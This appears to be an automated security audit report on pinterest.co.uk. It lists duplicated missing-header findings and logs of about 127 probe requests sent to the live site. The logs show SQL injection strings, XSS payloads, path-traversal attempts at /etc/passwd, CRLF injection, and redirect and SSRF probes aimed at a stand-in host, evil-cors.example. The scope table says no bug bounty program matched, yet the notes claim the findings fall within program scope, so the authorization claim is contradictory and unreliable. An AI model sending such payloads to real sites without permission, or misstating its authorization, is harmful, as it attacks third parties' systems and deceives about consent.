# Security Audit Report - pinterest.co.uk

## Scope and authorization

| Item | Value |
|---|---|
| Target | https://pinterest.co.uk/ |
| Bug bounty program | [top-websites gist (no active program match)]() |
| Listed scope domain | pinterest.co.uk |
| Test date | 2026-09-24 09:36 UTC |
| Method | Non-destructive passive/active probing (GET requests only, no forms submitted, no auth) |

## Summary

Total findings: **9** (High: 0, Medium: 0, Low: 7, Info: 2)

| # | Severity | ID | Finding | CWE |
|---|---|---|---|---|
| 1 | low | H1 | Missing HSTS header | CWE-319 |
| 2 | low | H2 | Missing CSP header | CWE-1021 |
| 3 | low | H2 | Missing CSP header | CWE-1021 |
| 4 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 5 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 6 | low | H4 | No clickjacking protection | CWE-1023 |
| 7 | low | H4 | No clickjacking protection | CWE-1023 |
| 8 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 9 | info | H5 | Missing Referrer-Policy | CWE-200 |

## Detailed findings

### 1. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Context:** http response
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 2. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Context:** http response
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 3. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 4. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Context:** http response
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 5. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 6. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Context:** http response
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 7. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 8. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Context:** http response
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 9. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

## Aggressive probe campaign

**Stage 1 - injection/reflection probes (28 requests):**

- no stage-1 probe hits (all probes negative)

**Stage 2 - aggressive probe suite v2 (99 requests):**

- no stage-2 probe hits (all probes negative)

Stage-2 probe log (observed responses):
- timing base=110ms id=113 search=110
- boolean b=308/255 t1=308/271 t2=308/271
- graphql /graphql -> 308
- graphql /api/graphql -> 308
- trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 308
- trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 308
- trav2 /%2e%2e%00.html -> 308
- trav2 /static//../../../../../../etc/passwd -> 308
- trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 308
- hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 308
- hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 308
- xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 308
- xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 308
- apicors /api -> 308
- apicors /api/v1 -> 308
- apicors /graphql -> 308
- apicors /rest -> 308
- apicors /v1 -> 308

## Evidence (raw response observations)

```json
{
  "http_status": 308,
  "http_redirect_to": "https://pinterest.co.uk/",
  "https_status": 308,
  "content_type": "text/html",
  "title": "Permanent Redirect",
  "path_gitconfig": 308,
  "path_envfile": 308,
  "path_securitytxt": 308,
  "path_robots": 308,
  "probe_count": 28,
  "probe_log": [
    "sqli /search?q=1%27+OR+1=1-- -> 308",
    "sqli /?id=1%27+OR+1=1-- -> 308",
    "sqli /?q=%27 -> 308",
    "sqli /products?filter=%27 -> 308",
    "sqli /?p=1;-- -> 308",
    "sqli-reflect /search?q=%27+OR+1=1-- -> 308",
    "xss /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 308",
    "xss /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 308",
    "xss /search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 308",
    "xss /?id=%3Csvg%20onload%3Dalert(1)%3E -> 308",
    "xss /search?term=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 308",
    "trav /..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> 308",
    "trav /static/../../../../../../../../etc/passwd -> 308",
    "trav /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> 308",
    "trav /..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini -> 308",
    "redir /redirect?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "redir /redirect?next=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "redir /?next=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "redir /go?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "redir /url?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "redir /out?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "crlf /?q=a%0d%0aX-Inj:%201 -> 308",
    "crlf /search?q=a%0d%0aX-Inj:%201 -> 308",
    "host no reflection -> 421",
    "ssrf /api/preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "ssrf /preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "ssrf /proxy?u=https%3A%2F%2Fevil-cors.example%2Fx -> 308",
    "ssrf /fetch?url=https%3A%2F%2Fevil-cors.example%2Fx -> 308"
  ],
  "v2_probe_count": 99,
  "v2_log": [
    "timing base=110ms id=113 search=110",
    "boolean b=308/255 t1=308/271 t2=308/271",
    "graphql /graphql -> 308",
    "graphql /api/graphql -> 308",
    "sweep no hits over 26 paths",
    "trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 308",
    "trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 308",
    "trav2 /%2e%2e%00.html -> 308",
    "trav2 /static//../../../../../../etc/passwd -> 308",
    "trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 308",
    "hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 308",
    "hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 308",
    "xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 308",
    "xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 308",
    "redir2 no hits over 49 requests",
    "apicors /api -> 308",
    "apicors /api/v1 -> 308",
    "apicors /graphql -> 308",
    "apicors /rest -> 308",
    "apicors /v1 -> 308"
  ]
}
```

## Notes

- All tests used a standard browser User-Agent; each site was probed with a two-stage aggressive GET-only suite (passive/header checks plus stage-1 and stage-2 injection, XSS, traversal, CORS and redirect probes, up to ~100 requests per site).
- No credentials were used; no state was modified on the target.
- Findings are reported against the public program scope; submission through the program tracker is pending.
